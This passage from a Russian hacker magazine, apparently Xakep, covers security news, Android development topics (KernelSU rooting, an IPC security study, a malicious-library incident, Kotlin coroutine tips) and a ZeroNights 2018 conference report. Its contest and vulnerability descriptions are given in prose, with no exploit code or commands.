    Тем не менее мы считаем, что они тоже заслуживают упоминания, пусть и совсем краткого.
→Зимние Олимпийские игры в Пхен чхане были атакованы вайпером Olympic Destroyer, который
    сохранил активность и после закрытия Олимпиады.
→Сложный вредонос  VPNFilter инфицировал  как минимум пол миллиона роуте ров  Linksys,
     MikroTik, NETGEAR, TP‐Link, ASUS, D‐Link, Huawei, Ubiquiti, UPVEL и ZTE, а также NAS про‐
    изводства QNAP в 54 странах мира.
→В Android нашли уязвимость, связанную с работой широковещательных сообщений (Broadcast).
    Баг позволяет перехватывать конфиденциальные данные.
→Создатели известного IoT‐вре доноса Mirai не получат тюремных сроков, так как активно сот‐
    рудничают с ФБР и помогают раскрывать преступления.
→Найден крип тографический баг, представляющий опасность для многих импле ментаций Blue‐
     tooth и миллионов самых разных устройств.
→Эксперты обнаружили сразу 13 опасных проблем в процес сорах AMD.
→Еще одна «процессорная» уязвимость, TLBleed, вынудила разработчиков OpenBSD отка заться
    от поддержки тех нологии Hyper‐Threading в процес сорах Intel.
→Арест лидера не прекратил деятель ность известной хак‐груп пы Cobalt: злоумышленники про‐
    должают атаковать крупные бан ки Рос сии, СНГ и Румынии.
→Был обнаружен вредонос Triton, предназначен ный для атак на спе цифическое оборудо вание
    производства Schneider Electric, а через него на промышленные сис темы управле ния и объекты
    ключевой инфраструктуры.
→Вступил в силу Общий регламент по защите данных (General Data Protection Regulation, GDPR),
    заставляющий всех игроков рын ка (не только в ЕС) по‐новому пос мотреть на вопросы обработ‐
    ки и хранения персональных дан ных.
HEADER
ANDROID





       НОВЫЙ МЕТОД РУТИНГА
     И БОЛЬШОЕ ИССЛЕДОВАНИЕ
         БЕЗОПАСНОСТИ IPC
          В ПРИЛОЖЕНИЯХ





В этом выпус ке: новый метод рутинга An‐
droid‐смартфонов, большое исследова ние
безопасности методов обмена дан ными
в приложениях, вредоносные библиотеки,
которые могут попасть в твой (и не только)          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
код  случайно.  А  также:  спо собы  сок‐              zobnin@glc.ru
ращения  размера  приложе ния,  трюки
с инициализацией библиотек, антисове ты
Kotlin и большая подборка инструмен тов
и библиотек разработчиков.


                ПОЧИТАТЬ


Но вый метод рутин га
Kernel Assisted Superuser (KernelSU) — The Final Frontier for SafetyNet and an
Essential Developer Tool — небольшая статья о KernelSU, новом способе
рутинга Android путем прямого патчинга ядра.
  В последнее время одним из основных методов получения прав root
на Android стал Magisk. Он использует так называ емый systemless‐способ
рутинга, когда вместо модификации раз дела system поверх него подключает‐
ся виртуальный раздел, содержащий бинарный файл su, необходимый при‐
ложениям для получения прав root. Такой метод поз воля ет избежать проблем
с обновлениями, а также эффективно скрывать наличие прав root на устрой‐
стве.
  Проблема, однако, в том, что Google и разработчики приложений изоб‐
ретают новые методы обна ружения root, а разработчику Magisk приходится
придумывать методы борь бы с ними. В долгосрочной перспективе способы
скрытия могут исчерпаться.
  Метод  KernelSU,  предложенный  раз работчиком  zx2c4,  базируется
на совершенно другой идее. Вместо подклю чения виртуального раздела
или физического размещения файла su в разделе system он использует
модифицированное ядро, чтобы заставить приложения «думать», что в сис‐
теме действительно есть файл /system/bin/su. Ядро перехватывает все
обращения к этому файлу и, если приложение пытается с его помощью
запустить команды, автоматичес ки исполня ет их с пра вами root.
  Работая прямо в ядре, KernelSU имеет гораздо больше воз можнос тей
для скрытия и обхода различных ограничений Android, в том числе правил
SELinux.
  В данный момент про ект KernelSU находится в зачаточной стадии раз‐
вития. Доступен  только  патч,  который  энтузиасты  могут  использовать
для сборки кастомных ядер.


Не безо пасный IPC в соф те для Android
Security Code Smells in Android ICC — боль шое исследование безопасности
приложений, использующих механизмы межпроцес сного взаимодей ствия An‐
droid. Авторы взяли около 700 открытых приложений из репозитория F‐Droid
и проанализировали, есть ли в их коде проблемы в использовании IPC.
   Анализ был произведен с помощью специально соз данного инс трумента
AndroidLintSecurityChecks, который показывает наличие в коде потенциальных
брешей. Все проблемы скомпонова ли в 12 категорий:
 • SM01: Persisted Dynamic Permission. В Android есть механизм, позволя‐
  ющий   пре доставить   другому   приложению   временный   доступ
   к какому‐либо URI своего ContentProvider’а. Это делается с помощью
   метода Context.grantUriPermission() . Если приложение вызывает
   его, но не вызывает Context.revokeUriPermission() , чтобы отозвать
   доступ, — есть проб лемы.
 • SM02: Custom Scheme Channel. Любое приложение может зарегистри‐
   ровать собственную URI‐схему, такую как myapp:// , вне зависимости
   от того, использует ли такую схему дру гое приложение. Как следствие,
   пересылать важные данные, используя кастомные URI‐схемы, крайне
   небезопасно.
 • SM03: Incorrect Protection Level. В Android есть система раз решений
   и любое приложение может создать свое собственное разрешение
   для доступа к своим данным. Но есть проб лема: если указать неправиль‐
  ный уровень защиты разрешения (protection level), оно может не сра‐
   ботать. Если разработчик хочет, чтобы пользователь видел диалог зап‐
   роса разрешений, он должен использовать уровень защиты dangerous
   или signature, если данное раз решение должно получать только приложе‐
   ние с той же цифровой подписью.
 • SM04: Unauthorized Intent. Любое приложение в Android может зарегис‐
   трировать себя в качестве обра ботчика определенных типов интентов (in‐
    tent). По умолчанию этот обработчик будет открыт все му миру, но его мож‐
   но защитить с помощью системы разрешений и строгой валидации вход‐
   ных данных.
 • SM05: Sticky Broadcast. Любое приложение может пос лать дру гому при‐
   ложению интент. Более того, оно может послать широковещательный
   интент сразу всем приложениям, и он будет обработан первым приложе‐
   нием, способным его принять. Но есть  также возможность послать
  широковещательный sticky‐intent, который после обработки одним при‐
   ложением все равно будет дос тавлен другим при ложе ниям. Чтобы этого
   не происходило, не стоит использовать такие интенты, а от широковеща‐
   тельных интентов лучше отка заться вооб ще.
 • SM06: Slack WebViewClient. Компонент WebView позволяет приложениям
   показывать веб‐страницы внутри своего интерфей са. По умолчанию он
   никак не фильтрует открываемые URL, чем мож но воспользоваться, нап‐
   ример, для фишинга. Разработчикам стоит либо использовать белый спи‐
   сок адресов, либо выполнять проверку с помощью SafetyNet API.
 • SM07: Broken Service Permission. При ложения могут предоставлять дос‐
   туп к своей функциональнос ти с помощью сервисов. Злоумышленник
  может использовать эту возможность для запус ка кода с повышенными
   полномочиями (пол номочиями сервиса). Чтобы этого избе жать, сервис
   должен проверять полномочия вызыва ющего при ложе ния с помощью
   метода Context.checkCallingPermission() .
 • SM08: Insecure Path Permission. Некоторые приложения пре дос тавляют
   доступ к своим данным с помощью ContentProvider’а, который адресует
   данные, используя UNIX‐подобные пути: /a/b/c . Программист может
   открыть доступ к своему ContentProvider’у, но отрезать дос туп к некоторым
   путям (например, к /data/secret). Но есть проб лема: разработчики час‐
   то используют класс UriMatcher для сравнения путей, а он, в отличие от An‐
   droid, сравнивает их без учета двойных слешей. Отсюда могут возникнуть
  ошибки при разрешении и запрете дос тупа.
 • SM09: Broken Path Permission Precedence. Сходная с предыдущей
   проблема. При описании ContentProvider’а в манифесте раз работчик
  может указать, какие разрешения нуж ны при ложению для доступа к опре‐
   деленным путям. Но в Android есть баг, из‐за чего он отдает предпочтение
   более глобальным путям. Например, если приложение дает доступ к /
  data всем подряд, но использует специальное раз решение для дос тупа
   к /data/secret, то в ито ге доступ к /data/secret смогут получить все.
 • SM10: Unprotected Broadcast Receiver. Фактически аналог проблемы
  SM04, но распространяющийся исключительно на BroadcastReceiver’ы
   (специальные обработчики интентов).
 • SM11: Implicit Pending Intent. Кроме интентов, в Android есть сущность
   под названием  PendingIntent. Это своего рода отложенные интенты,
   которые могут быть отправлены позже и даже дру гим приложением
   от имени создавшего интент приложения. Если PendingIntent широковеща‐
   тельный, то любое приложение сможет перехватить его и послать интент
   от имени это го приложения.
 • SM12: Common Task Affinity. Об этой проб леме мы уже рассказывали
   в «Хакере». Суть в следующем: в Android все экра ны при ложения (activity)
  объединяются в таск, который представляет собой своего рода стопку
   экранов. В то же время в Android есть средство, которое поз воляет одно‐
   му приложению всунуть свой экран в стопку другого приложения. Для это‐
   го буквально достаточно ука зать имя этого приложения в атрибуте an
  droid:taskAffinity у активности, которую нужно внедрить. А чтобы
   защититься, разработчик должен указать в этом атри буте пус тую строку.





              Общая рас простра ненность ошибок

В работе также приводится мно жес тво ана литичес ких данных. Например,
согласно статистике, в новых приложениях мень ше дыр, чем в старых. Боль‐
ше дыр также в приложениях, которые разрабатывают более пяти человек. Ну
и, сюрприз‐сюрприз, большее количес тво кода озна чает большее количес‐
тво уязвимостей.


Вре доносные биб лиоте ки
A Confusing Dependency — поучительная история о том, как можно добавить
в приложение зловредный код, всего лишь подклю чив популярную библиоте‐
ку.
  Все началось с того, что автор решил подключить к проекту библиотеку
AndroidAudioRecorder и обна ружил, что сразу после старта приложение кра‐
шится, выбрасывая исключение java.lang.SecurityException: Permission denied
(missing INTERNET permission?). Это озна чает, что приложение не может
получить доступ к интернету, так как отсутс твует необ ходимое для этого раз‐
решение.
  Выходит, библиотеке для записи звука с микрофона почему‐то нужен
интернет? Автор взглянул в код приложения и нашел в нем метод, отсы‐
лающий на удаленный сервер модель и произво дителя смартфона. В попыт‐
ках разобраться, зачем разработ чику популярной библиоте ки вставлять
в свою библиотеку такой противо речивый код, он попытал ся найти такой же
участок кода в официальном репозитории биб лиотеки и не нашел его.
  Получалось, что разработ чик намеренно обманывал пользователей биб‐
лиотеки, распространяя альтернативную сборку биб лиотеки, которая отли‐
чается от официальных исходников. Или... кто‐то залил в репозиторий фей‐
ковую библиоте ку.
   Суть истории. Существу ет репозиторий Java‐пакетов jCenter, при вязанный
к системе дистрибуции Bintray. Android Studio использует jCenter как дефол‐
товый репозиторий для новых проектов: он уже вклю чен в список репозитори‐
ев в build.gradle наряду с репозиторием Google. Однако многие разработ‐
чики предпочитают размещать свои биб лиотеки в репозитории  JitPack,
который умеет автоматически генерировать и выкладывать в репозиторий
библиотеки из GitHub‐репозитория (это удобно и просто).
  Библиотека AndroidAudioRecorder также была выложена в JitPack, так что
автор статьи перед ее использованием добавил JitPack в build.gradle.
Но оказалось, что в jCenter тоже была выложена эта библиоте ка с внед‐
ренным в нее зловредным кодом. А так как jCenter в спис ке репозиториев
идет первым, система сборки взяла биб лиотеку именно из него, а не
из JitPack.
  Один из способов решения этой проб лемы — разместить jCenter в конце
списка репозиториев в build.gradle.





                        Ку сок зловредного кода


              РАЗРАБОТЧИКУ


Со веты по использованию коро утин в Kotlin
Kotlin Coroutines patterns & anti‐patterns — хорошая под борка советов и анти‐
советов о короутинах Kotlin.


        Заворачивай вызовы async в coroutineScope или используй Supervisor-
                                          Job для работы с исклю чениями


val job: Job = Job()
val scope = CoroutineScope(Dispatchers.Default + job)
// Может выбросить исключение
fun doWork(): Deferred<String> = scope.async { ... }
fun loadData() = scope.launch {
    )try {
        doWork().await()
    } catch (e: Exception) { ... }
}

Этот код упадет, даже нес мотря на попытку обра ботки исключения: сбой
в дочерней короутине приведет к немедленному сбою в родительской.
   Чтобы избежать этого, дос таточно использовать SupervisorJob:


val job = SupervisorJob() // <‐‐
val scope = CoroutineScope(Dispatchers.Default + job)
// Может выбросить исключение
fun doWork(): Deferred<String> = scope.async { ... }
fun loadData() = scope.launch {
    try {
        doWork().await()
    } catch (e: Exception) { ... }
}


                        Ис пользуй Main Dispatcher в корневой короутине


Если тебе необходимо постоянно вызывать короутины Main Dispatcher (нап‐
ример, для обновления экрана), используй Main Dispatcher как основную
короутину.
   Большая часть следующего кода выполняется в рамках Main Dispatcher:


val scope = CoroutineScope(Dispatchers.Default)
fun login() = scope.launch {
    withContext(Dispatcher.Main) { view.showLoading() }
    networkClient.login(...)
    withContext(Dispatcher.Main) { view.hideLoading() }
}

Так почему бы не переписать код так, чтобы основная часть была в Main
Dispatcher:


val scope = CoroutineScope(Dispatchers.Main)
fun login() = scope.launch {
    view.showLoading()
    withContext(Dispatcher.IO) { networkClient.login(...) }
    view.hideLoading()
}


                  Из бегай использования async/await там, где это не нужно


Код, подобный этому:


launch {
    val data = async(Dispatchers.Default) { /* code */ }.await()
}

лучше заменить на такой:


launch {
    val data = withContext(Dispatchers.Default) { /* code */ }
}

Этот код не порождает новые короутины, более производителен и нагляден.


                                       Из бегай завершения Scope Job


Представим такой код:


class WorkManager {
    val job = SupervisorJob()
    val scope = CoroutineScope(Dispatchers.Default + job)
    fun doWork1() {
        scope.launch { /* do work */ }
    }
    fun doWork2() {
        scope.launch { /* do work */ }
    }
    fun cancelAllWork() {
        job.cancel()
    }
}
fun main() {
    val workManager = WorkManager()
    workManager.doWork1()
    workManager.doWork2()
    workManager.cancelAllWork()
    workManager.doWork1()
}

Его проблема в том, что повторно короутина через метод doWork1 не запус‐
тится, потому что кор невая для нее задача уже завершена.
  Вместо этого сле дует использовать функцию cancelChildren:


class WorkManager {
    val job = SupervisorJob()
    val scope = CoroutineScope(Dispatchers.Default + job)
    fun doWork1(): Job = scope.launch { /* do work */ }
    fun doWork2(): Job = scope.launch { /* do work */ }
    fun cancelAllWork() {
        scope.coroutineContext.cancelChildren()
    }
}
fun main() {
    val workManager = WorkManager()
    workManager.doWork1()
    workManager.doWork2()
    workManager.cancelAllWork()
    workManager.doWork1()
}


             Пос тарайся не писать suspend-фун кции с неяв ным дис петче ром


Представь такую функцию:


suspend fun login(): Result {
    view.showLoading()
    val result = withContext(Dispatcher.IO) {
        someBlockingCall()
    }
    view.hideLoading()
    return result
}

Запустив ее с разными диспетчерами, ты получишь совершенно разные
результаты:


launch(Dispatcher.Main) {     // Все нормально
    val loginResult = login()
    ...
}
launch(Dispatcher.Default) {  // Падение
    val loginResult = login()
    ...
}



      CalledFromWrongThreadException: Only the original thread that created
      a view hierarchy can touch its views.

Правильный вариант:


suspend fun login(): Result = withContext(Dispatcher.Main) {
    view.showLoading()
    val result = withContext(Dispatcher.IO) {
        someBlockingCall()
    }
    view.hideLoading()
    return result
}


                                   Из бегай использования GlobalScope


Если ты в своем коде постоянно делаешь


GlobalScope.launch {
    // code
}

прекрати немедленно. GlobalScope предназна чен для короутин, жиз ненный
цикл которых такой же, как у всего при ложения. Это может привести к появ‐
лению короутин‐зомби, которые давно не нужны, но до сих пор живут.
Используй CoroutineScope для привязки короутин к какому‐либо контексту,
при исчезновении которого они будут завершены.
  В Android с этим еще проще. Коро утины можно ограничивать активнос‐
тями, фрагментами, View, ViewModel:


class MainActivity : AppCompatActivity(), CoroutineScope {
    private val job = SupervisorJob()
    override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main + job
    override fun onDestroy() {
        super.onDestroy()
        coroutineContext.cancelChildren()
    }
    fun loadData() = launch {
        // code
    }
}


Как мак симально сок ратить раз мер приложе ния
Build your Android app Faster and Smaller than ever — статья о том, как сделать
приложения ком пактнее и собирать их быстрее. Вторая часть статьи (про
скорость сборки) не осо бо полезна и интерес на, поэтому остановимся толь‐
ко на способах уменьшения раз мера APK. Итак, как сделать приложение
меньше?
 • Удалить неисполь зуемые ресурсы: Refactor → Remove unused resources.
 • Удалить лишние зависимости. Многие биб лиотеки позволя ют включать
   в приложение не всю библиотеку, а только ее части. Чтобы узнать, из каких
   компонентов  состоит библиотека, можно  использовать команду ./
  gradlew app:dependencies.
 • Разбить приложение на несколько APK в зависи мости от DPI экрана.
  Для этого есть директива splits в build.gradle, но, если ты выкладыва‐
  ешь приложение исключитель но в Google Play, лучше использовать Appli‐
   caton  Bundle,  который  магазин  приложений  потом сам  разбивает
   на отдельные APK.
 • Разбить приложение на нес колько APK в зависимости от архитектуры про‐
   цессора. Для это го можно использовать все те же splits или Applicaton
   Bundle.
 • Собрать приложение только с нужными ресурсами. Если нужна версия
   приложения исклю чительно для локального рынка, можно использовать
   директиву resConﬁgs.
 • Удалить неиспользуемые ресурсы. Директива minifyEnabled сжимает код,
   но, кроме нее, также существу ет директива shrinkResources, которая сжи‐
   мает ресурсы, выбрасывая неиспользуемые.
 • Использовать Shape Drawable. Если есть необ ходимость залить фон гра‐
   диентом или отобразить какую‐нибудь фигуру, лучше использовать Shape
   Drawable вместо изоб ражений.
 • Использовать WebP. Формат WebP обес печива ет на 30% лучшее сжатие
   в сравнении с PNG.
 • Использовать VectorDrawable. Начиная с вер сии 5 Android поддержи вает
   векторные иконки. Они намного ком пактнее обычных.





                     Уда ляем ненужные ресурсы


Трюк с инициализацией биб лиотек
Your android libraries should not ask for an application context — короткая замет‐
ка о работе системы инициализации Firebase.
  Ты мог заметить, что многие приложения требуют инициализировать себя
перед использованием. Обычно для это го необходимо создать объ ект Appli‐
cation и добавить в него нечто похожее:


class MainApplication : Application() {
    override fun onCreate(){
        super.onCreate()
        // Инициализация четырех библиотек
        Fabric.with(this, new Crashlytics())
        Stetho.initializeWithDefaults(this)
        JodaTimeAndroid.init(this)
        Realm.init(this)
    }
}

Но также ты мог заметить, что библиотека Firebase ничего подобного не тре‐
бует. Ты можешь сказать, что, возможно, ей вооб ще не нужен доступ к контек‐
сту или ее инициализация происходит позже, перед использованием. Но нет,
требует, и она не просит инициализировать себя поз же.
  На самом деле секрет в том, что в файле AndroidManifest.xml биб‐
лиотеки Firebase есть такой кусок:


<provider
    android:name="com.google.firebase.provider.FirebaseInitProvider"
    android:authorities="${applicationId}.firebaseinitprovider"
    android:exported="false"
    android:initOrder="100" />

Это декларация ContentProvider’а. Но это не ContentProvider. Класс Fireba‐
seInitProvider как раз и содержит код инициализации библиоте ки.
  Во время сбор ки приложения среда разработки объ еди няет файлы An‐
droidManifest.xml твоего приложения и всех подключенных библиотек
в единый файл. А во время запус ка приложения Android выполняет код ини‐
циализации всех провайдеров еще до запуска самого при ложения. Так
и получается, что инициализация Firebase происхо дит на ранней стадии
без посторонней помощи.


             ИНСТРУМЕНТЫ


 • gradle‐kotlin‐dsl‐libs — плагин Gradle для управления зависимостями;
 • Awesome Kotlin — пла гин Android Studio для поиска библиотек в од ноимен‐
  ном каталоге.


              БИБЛИОТЕКИ


 • Cyanea — мощный движок тем, поз воляющий на лету применять темы;
 • log4k — библиотека логирования для Kotlin, вдохновленная log4j;
 • Rialto — библиотека для стилизации текста с использованием аннотаций;
 • Barista — библиотека UI‐тес тирования на основе Espresso;
 • slycalendarview —  календарь  в  стиле  Material  Design, поз воляющий
   выбирать дни или интервалы;
 • Regret — своего рода стек для объектов, поз воляющий выполнять опе‐
   рации Undo/Redo;
 • klaster — библиотека для быстрого создания адаптеров для RecyclerView
   в функциональном стиле;
 • KM‐Quick‐Adapter — еще один генера тор адаптеров для RecyclerView;
 • Hasher — простая в использовании биб лиотека хеширования (алгоритмы
  MD5, SHA‐1, SHA‐256, SHA‐384 и SHA‐512);
 • Valigator — библиотека для валидации полей EditText и вывода на экран
   предупрежде ний;
 • Android‐EditText‐Validations — еще один валида тор для TextView;
 • Material Popup Menu — popup‐меню в стиле Material Design;
 • Flutter‐for‐Android‐developers — кол лекция матери алов для изу чающих
  фреймворк Flutter.
HEADER

       ZERONIGHTS 2018ОТЧЕТ С
 КАК ПРОХОДИЛА ТОПОВАЯ КОНФЕРЕНЦИЯ
      ПО ИНФОБЕЗОПАСНОСТИ





 20–21  нояб ря  в  прекрасном  городе
 Санкт‐Петербурге,  в  концертном  клубе
А2  проходила  восьмая  хакерская  кон‐
ференция ZeroNights 2018. Перед тобой —         Денис Новиков
                                                                                               darwin@r0crew.org
 отчет о том, как это было, с отзывами учас‐
 тников и эксклюзивным фоторепортажем.


 Как это заведено, на ZeroNights были члены моей команды R0 CREW, в том
 числе и  я  сам, Денис Новиков  aka  Darwin — комьюнити‐менеджер,
 реверс‐инженер и прос то фотог раф. От моего лица и пойдет дальнейшее
 повествование.
   Вечером накануне ZN некоторые из наших мемберов и знакомых уже
 успели обустроиться в своих номерах и решили двинуть в клуб на пред‐
 варительную регистрацию. Там они зас тали установку некоторых стендов
 и получили презенты в виде пинов — поощрение за раннюю регистрацию,
 которое полагалось первым 400 зарегистри ровавшимся.
    Увы, меня сре ди этих счас тливчиков не было — я в тот момент только
 садил ся в «Сапсан» и предвкушал гря дущее мероприятие.





 УТРО ПЕРВОГО ДНЯ
 В десять утра я прошел металлоискатели, зарегис трировал ся на ресепшене,
 получил заветный пин и двинул на фото охоту.





 Первые технические доклады начина лись в 12:30, поэтому было время нем‐
 ного оглядеться и посмотреть, куда я попал.





 А попал я первым делом на вто рой этаж — сам не знаю как! Он привлек меня
 своей подсветкой. Там я обна ружил сразу три конкурса.


 Кон курс «Игро вой авто мат»
 Подробности
   Организатор: DC7812 (Санкт‐Петербург)
   Однорукий бандит пос троен на основе смарт‐контракта EOS с несколь‐
 кими уязвимостями (целочисленным переполнением и парой на отсутствие
 проверки прав). В конкурсе поучаствовало около двадцати человек — неп‐
 лохо, если учесть, что смарт‐контракты на EOS не настолько популярны,
 как на Ethereum. Трое из участников успешно спра вились со всеми задачами.
 Конкурс мне запомнился тем, что в числе призеров была девушка — это не
 может не радовать.





 Кон курс «Открой ящик — забери приз!»
 Подробности
   Организатор: Павел Жовнер
   Этот конкурс — для любителей ломать бес контактные карты. Внутри
 в качестве приза лежал Proxmark3 (универсальная штука для работы с RFID‐
 системами). Он полагался тому, кто первым откроет ящик. Следующие трое
 счастливчиков получили Chameleon Mini. Чтобы открыть ящик, нужно было
 определить протокол общения карты и считыва теля, разобрать формат хра‐
 нения данных в памяти, обойти систему авторизации карты и научиться под‐
 делывать баланс. В кон курсе приняло участие около ста человек.





Отзыв Сер гея Белова, Mail.Ru
 Если вы посещали хотя бы три случайных ZeroNights, то вы уже, скорее всего,
 знаете, что каждая ZeroNights не похожа на предыдущую. Этот год не стал
 исключением, а толь ко подтвердил это, да еще и вернул конференцию на ее
 родину — в Санкт‐Петербург, что лично я вос принял очень хорошо.
   Для жителей Дефолт‐сити это сно ва ста ло событием — надо покупать
 билеты, брониро вать  гостиницу, кооперировать ся с  кем‐нибудь,  чтобы
 веселее было ехать. ZeroNights — снова событие, которое ты планируешь
 заранее.
   Помеще ние, атмосфера, комфорт — клуб А2 подошел очень хорошо
 для формата конференции. Выдержанный, неяркий свет, тематическое офор‐
 мление, место, уже адаптированное для при ема боль шого количес тва людей.
   Ходить по докладам я не успевал, так как надо было заниматься стендом и,
 в основном, нетворкингом, поэтому жду интерес ные для меня доклады
 в записи (в первую очередь Unveiling the cloak: A behind‐the‐scenes look
 at what happens when you click that link Ильи Нес терова и Сергея Шекяна).
 Успел только на Web Village, и там, как обычно, был полный зал. :)
   Я пока не представляю, чего ожидать от следующей ZN, но знаю одно —
 это мероприятие, на которое нужно обязательно попасть.



 Кон курс‑квест «DefHack 2018.11: Пре вед, мед вед!»
 Подробности
   Организатор: DC7831 (Нижний Новгород) и DC20e6 (Ульяновск)
   Этот квест был доступен онлайн для всех желающих. Он включал несколь‐
 ко задач на реверс, форензику, веб, PWN, OSINT и подобное. Всего было
 семь заданий. Некото рые из них сос тояли из множества подзадач. В кон‐
 курсе приняло участие более ста человек. В опи сании было сказано, что
 сложность большинства заданий низкая или средняя и они вполне под силу
 любому админу, программисту и тестировщику, не говоря уже о пентесте рах.
 В итоге на самой конференции семнадцать человек решило большую часть
 заданий, но не все. Тем не менее люди без при зов не остались. Те, кто решил
 быстрее всех, получили футболки с логотипом DEFCON NN.





 На фото — два разработчика конкурса (на переднем плане). За ними, как я
 потом уже узнал, сидели ребята, отвечающие за Hardware Villages.





 Недалеко от них на пуфиках участники решают задания. Кстати, здесь на фото
 Влад Росков (v0s) и Виктор Алюшин (AV1ct0r), которые первыми «открыли
 ящик» из конкурса выше.





Пре вед, мед вед!
 Конкурс дефкон‐групп Нижнего Новгорода и Ульяновска был доступен
 онлайн всем желающим — дос таточно было зарегистрироваться на сайте yo‐
 corp.ru, чтобы погрузиться в виртуальный мир антиутопии и путешествовать
 по нему, выполняя задания. Все начинается с поступления на работу в отдел
 расследования инцидентов мегакорпорации «Ё‐корп».
   Распутывание дел в роли белого хакера приводит к встре че с группиров‐
 кой серых хакеров «Друзья Чиполлино», обитающих в сети Tor и оттуда про‐
 водящих атаки на кор порацию. Парал лельно с этим раз ворачивается про‐
 тивостояние между «Друзьями» и группировкой черных хакеров APT30 Caval‐
 ryBear («Кавалерийский медведь»).
   Уже после завершения конференции все задания решил Станислав
 Поволотский.



 Кон курс «Перехвати письмо»
 Подробности
   Организатор: поч та Mail.Ru
   Я спустился на пер вый этаж и нашел там четвертый конкурс. Этот таск был
 оформлен в виде стенда и представлял собой офисное здание, оснащенное
 пневмопочтой, по которой некий руководитель отправлял письма бухгалтеру.
   Участники, переключая зас лонки, должны были поменять путь письма
 и перехватить его. Конкурс, понятное дело, был дос тупен только офлайн, и,
 несмотря на это, за два дня в нем приняло учас тие 100–200 человек!





 На самом стенде было два задания. В первом нуж но было найти хост, отве‐
 чающий за мониторинг состояния сети, и обна ружить там типовую уяз вимость
 конфигурации в веб‐сервере Apache, страницу /server‐status. На ней
 отображались все приходящие HTTP‐зап росы. В том числе там можно было
 найти запрос с секретным ключом, который поз волял пройти первый уровень.
 За выполнение этого задания участники получа ли промокод на 100 долларов
 для фирменной программы Bug Bounty.





 Во втором задании нужно было внимательно изучить строение страницы
 мониторинга. В коде клиент ского приложения необ ходимо было найти скры‐
 тый метод, который не вызывался из интерфей са. Он содержал в себе сле пую
 инъекцию NoSQL в MongoDB. Слож ность заключалась в том, что исполь‐
 зовал ся нетипичный стек технологий. MeteorJS (который активно юзает Web‐
 Sockets) и MongoDB с pub/sub вместо привычных HTTP‐запросов и ответов
 не позволяли использовать готовый инс трументарий и тре бовали от учас тни‐
 ков умения самостоятельной  автоматизации  атак. Успешно решившие
 это задание получали тол стовку.





 Стенд Сбербанка
 Сначала я даже не понял, почему там топчется народ, но вскоре выяснилось,
 что у Сбербанка хороший техничес кий стенд с лекциями и воркшопом по кар‐
 точкам.
   Один из тасков заключался в том, чтобы записать на карту спе циально
 созданный апплет EMV, который поз волит успешно пройти авторизацию
 в POS‐терминале и даст возможность купить фут болку или USB‐брелок.





Отзыв коман ды RuCTFE
 Приехали мы на ZeroNights. Добирались легко, пришли заранее и уже
 на выходе получили клас сные значки.

О мер че и рек ламе
 Порадовало, что нет раз номастных спонсорских роллапов на каждом углу —
 все выдержано в едином стиле, напеча тано на собственных пресс‐вол лах.
 Сами же спонсоры на площадке предлагали действительно интересные
 активности и вор кшопы, а не бесполезный мерч и другие безделушки.
   Классно было пообщать ся с комь юни ти, встретить вживую  тех, кого
 ни разу лично не видел. Мы сильно раз несены по стране и обычно общаемся
 только с помощью мессенджеров и почты.
   Отдельно надо сказать про доклады. Порадовал выбор и тем, и самих спи‐
 керов. Слабых докладов не было вовсе, многие из них были интересны нам.
   Жаль, что во второй день у одно го лектора с темой про ресерч безопас‐
 ности роутеров не хватило времени, чтобы закончить доклад. Не получилось
 дослушать его до конца и задать вопросы.

Пло щад ка с точ ки зре ния ком форта
 Ребята выделили второй этаж А2 для людей с ноутбуками. Можно было
 без проблем подой ти к пилотам, встать на зарядку и поработать за столиком.
   Отдельное спасибо ребятам надо сказать за путеводитель на сай те.
 По нему легко было сориентироваться и сходить, например, поесть поб‐
 лизости. Наверное, без него было бы куда сложнее.

 Из недоче тов
 Переводчицы‐синхронис тки, по всей видимости, не были готовы к насыщен‐
 ной терминами речи, и в какой‐то момент перевод терял смысл. А еще грус‐
 тно было узнать, что организаторы убрали секцию Community, на которой мы
 обычно выступали с докладом. Но взамен появился «Свободный микрофон»
 в последний день, где мог выступить любой желающий. Так мы помогли
 решить проблему другому человеку, вкратце рас сказав об Ansible.

 Ес ли подыто жить
  1. Отлично выдержанная атмосфера андеграунда. Правильная стилистика
   мероприятия, все смот релось лаконично.
  2. Партнеры и спонсоры предлагали  что‐то дей ствительно интересное
   на своих стендах.
  3. Актуальные и сильные доклады.
  4. Возможность общения с сообщес твом. На площадке для этого были соз‐
   даны все усло вия.

 А еще после всего нам подарили баннер с нашей символикой и предложили
 забрать клевую фир менную бочку. Все бы хорошо, но в Екатеринбург мы бы
 с ней не улетели. :)





                                      Продолжение статьи →
HEADER               ← НАЧАЛО СТАТЬИ
            ОТЧЕТ С
    ZERONIGHTS 2018
            КАК ПРОХОДИЛА ТОПОВАЯ КОНФЕРЕНЦИЯ
                     ПО ИНФОБЕЗОПАСНОСТИ





MAIN.TRACK
Побродив по стендам, я отправился в главный зал, где шел MAIN.TRACK.
Как ни странно, явился я как раз вовремя! Там у микрофона уже был предста‐
витель Crush SEMrush, который объявлял о старте своего онлайнового кон‐
курса.





Всем желающим предложили попытать свои силы в поиске уяз вимос тей
на semrush.com. Ради этого мероприятия ребята, отве чающие за безопас‐
ность ресурса, на время проведения конференции даже отключили WAF.
Наиболее отличившимся багхантерам в качестве при зов обещали MacBook
Air, PlayStation 4 Pro и квадрокоптер DJI Spark. На макбук никто не нахантил,
а вот приставка и квадрокоптер нашли сво их обла дателей.
  Следом мы  послушали  предста вителя  Сбербанка,  а  потом  всех
еще какое‐то время развлекал Алексей Син цов из DC7812. Как я понял, в этот
момент организаторы пытались установить видеосвязь с keynote‐спикером,
который, к сожале нию, не смог приехать из‐за проблем с организацией Hack
In The Box Dubai 2018 (она была почти сра зу пос ле ZeroNights — 25‐го числа).





ОБСТАНОВКА
Есть люди, которым в первую очередь интерес ны доклады, а кто‐то при езжа‐
ет ради общения и дру гих активнос тей. Поэтому, как только виде освязь
со спикером наладилась, я отпра вился бродить по клубу.





Первым делом пошел пос мотреть, что там привез Сбербанк.





Команда Check Point из Минска (которая приеха ла сос тавом аж из один‐
надцати человек) что‐то усердно изу чает — наверное, программку. :) Мне,
кстати, не хватало бумажной программы, в телефоне смотреть неудобно.





Серьезные лица сотрудников Сбербанка. Немудрено — стенд все время был
чуть ли не на осадном положении. А девуш ка мне кого‐то напомнила —
может, в рекламе ее видел?





Между прочим, одна из самых симпатичных блондинок конференции была
на стенде Mail.Ru.





Было две сцены. Вок руг большой сцены — пять барных стоек. К сожалению,
сфоткать не додумался, извините.
